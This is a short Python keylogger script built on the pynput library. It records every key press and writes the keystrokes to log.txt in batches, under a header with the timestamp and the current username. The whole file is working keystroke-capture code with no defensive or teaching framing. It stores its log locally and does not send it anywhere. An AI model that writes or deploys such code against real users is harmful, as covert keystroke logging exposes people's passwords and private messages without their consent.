from pynput.keyboard import Key, Listener
import datetime 
import getpass
import glob

keys = []
count = 0

actions = {
    "Key.enter": '\n',
    "Key.space": ' ',
    "Key.shift": '',
    "Key.shift_r": '',
    "Key.backspace": '*DelChar*'
}

def on_press(key):
    global keys, count
    try:
        keys.append(actions[str(key)])
    except:
        keys.append(key)
    count += 1

    if count >= 5 :
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", 'a') as f:
        for key in keys:
                f.write(str(key).replace("'", ""))

with Listener(on_press=on_press) as listener:
    with open("log.txt", 'w') as f:
        f.write("Log datatime: {d} \nCurrent user: {u} \n\n".format(d=datetime.datetime.now(), u=getpass.getuser()))
    listener.join()